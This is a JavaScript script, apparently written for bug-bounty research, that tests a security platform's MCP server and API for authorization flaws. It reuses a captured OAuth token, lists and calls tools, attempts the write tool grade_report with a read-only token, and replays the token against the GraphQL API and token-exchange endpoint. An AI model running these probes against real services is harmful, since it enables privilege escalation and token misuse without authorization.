import fs from "fs";
const M = "https://bugsecure-mcp.senintel.sn/mcp";
const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");

// jeton a audience MCP : on le recupere via le catcher (PKCE deja en place pour la ressource MCP)
let MCP = "";
try {
  const r = await fetch("http://127.0.0.1:53682/token");
  const j = await r.json();
  MCP = j.access_token || "";
  if (MCP) {
    const p = JSON.parse(Buffer.from(MCP.split(".")[1], "base64url").toString());
    console.log("jeton MCP : scope=" + JSON.stringify(p.scope) + " | aud=" + p.aud + " | client_id=" + p.client_id + " | exp dans " + (p.exp - Math.floor(Date.now() / 1000)) + "s");
  }
} catch (e) { console.log("catcher indisponible:", e.message); }
if (!MCP) {
  // fallback : echanger le code de la session CLI contre un jeton MCP
  const pk = JSON.parse(fs.readFileSync("/tmp/opencode/pkce.json", "utf8"));
  console.log("(pas de jeton dans le cache du catcher)");
}

const rpc = async (body, headers = {}) => {
  const r = await fetch(M, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json, text/event-stream", ...headers }, body: JSON.stringify(body) });
  const t = await r.text();
  return { s: r.status, t, h: r.headers };
};
const H = MCP ? { Authorization: "Bearer " + MCP } : {};

console.log("\n=== 1) initialize + tools/list avec le jeton a audience MCP ===");
for (const origin of [undefined, "https://bugsecure.senintel.sn"]) {
  const hh = { ...H, ...(origin ? { Origin: origin } : {}) };
  const r1 = await rpc({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "bb-research", version: "1" } } }, hh);
  console.log("  initialize (Origin=" + (origin || "absent") + ") -> HTTP " + r1.s + "  " + r1.t.replace(/\s+/g, " ").slice(0, 170));
  await sleep(900);
  const r2 = await rpc({ jsonrpc: "2.0", id: 2, method: "tools/list" }, hh);
  console.log("  tools/list -> HTTP " + r2.s + "  " + r2.t.replace(/\s+/g, " ").slice(0, 400));
  await sleep(900);
}

console.log("\n=== 2) les outils d ECRITURE sont-ils proposes a un jeton en lecture seule ? ===");
const rl = await rpc({ jsonrpc: "2.0", id: 3, method: "tools/list" }, H);
let tools = [];
try {
  const j = JSON.parse(rl.t.replace(/^event: message\ndata: /, ""));
  tools = j?.result?.tools || [];
} catch (e) {
  const m = rl.t.match(/"name":"([a-z_]+)"/g);
  if (m) tools = m.map((x) => ({ name: x.replace(/"/g, "") }));
}
console.log("  outils annonces : " + tools.length);
const names = tools.map((t) => t.name || t);
console.log("  " + names.join(", "));
const WRITE = ["submit_report", "add_report_comment", "add_triage_comment", "update_report_status", "assign_report", "grade_report", "raise_appeal", "save_disclosure_draft", "update_my_profile", "mark_notifications_read"];
const present = WRITE.filter((w) => names.includes(w));
console.log("\n  outils d ecriture accessibles : " + (present.length ? present.join(", ") : "AUCUN"));
if (present.length) console.log("  >>> ESCALADE : le jeton n a que " + JSON.stringify(JSON.parse(Buffer.from(MCP.split(".")[1], "base64url").toString()).scope) + " mais le serveur propose des outils d ecriture");

console.log("\n=== 3) appel reel d un outil (l exchange vers l API fonctionne-t-il ?) ===");
for (const [tool, args] of [["search_programs", { query: "klds" }], ["get_leaderboard", {}], ["get_my_profile", {}]]) {
  const r = await rpc({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: tool, arguments: args } }, H);
  console.log("  " + tool.padEnd(22) + "HTTP " + r.s + "  " + r.t.replace(/\s+/g, " ").slice(0, 200));
  await sleep(1400);
}

console.log("\n=== 4) quel scope le serveur MCP a-t-il obtenu de l AS ? (via le WWW-Authenticate d un refus) ===");
const r4 = await rpc({ jsonrpc: "2.0", id: 5, method: "tools/call", params: { name: "grade_report", arguments: { reportId: "44444444-4444-4444-8444-444444444444", vrtNodeId: "cwe-79", severity: "LOW", cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N", cvssScore: 4.3, reasoning: "bb" } } }, H);
console.log("  grade_report (outil d ecriture) -> HTTP " + r4.s + "  " + r4.t.replace(/\s+/g, " ").slice(0, 260));
await sleep(1200);

console.log("\n=== 5) le jeton MCP est-il utilise tel quel contre l API (audience mixing) ? ===");
const r5 = await fetch(AS + "/graphql", { method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer " + MCP }, body: JSON.stringify({ query: "{ me { id username } }" }) });
console.log("  API /graphql avec le jeton MCP -> HTTP " + r5.status + "  " + (await r5.text()).replace(/\s+/g, " ").slice(0, 160));
await sleep(800);
const r6 = await fetch(AS + "/oauth/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: form({ grant_type: "urn:ietf:params:oauth:grant-type:token-exchange", subject_token: MCP, subject_token_type: "urn:ietf:params:oauth:token-type:access_token", client_id: "bugsecure-mcp-cli", resource: "https://bugsecure-api.senintel.sn" }) });
console.log("  token-exchange direct (client CLI) -> HTTP " + r6.status + "  " + (await r6.text()).slice(0, 200));
